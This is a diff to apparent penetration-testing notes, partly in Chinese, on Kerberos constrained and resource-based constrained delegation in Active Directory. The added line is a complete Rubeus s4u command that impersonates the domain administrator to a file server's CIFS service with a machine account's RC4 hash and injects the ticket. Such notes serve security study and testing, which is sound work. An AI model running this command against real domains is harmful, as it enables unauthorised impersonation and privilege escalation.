@@ -20,6 +20,8 @@ When the user requests access for a service ticket against a service that uses u
 
 rubeus or kekeo
 
+.\Rubeus.exe s4u /user:web01$ /rc4:46f5e45ca3d9e510adf06f3296a06fa2 /impersonateuser:administrator /msdsspn:cifs/file01 /ptt
+
 #### Resource-Based Constrained Delegation
 
 为了消除这个高权限，转而变成后端具有属性里有些哪些中间人可以代表他人、这样只需要最终目标的管理员权限就可以了,或者说某个已控制的用户有genetic write的权限，非域管理员权限，这是一个优点。
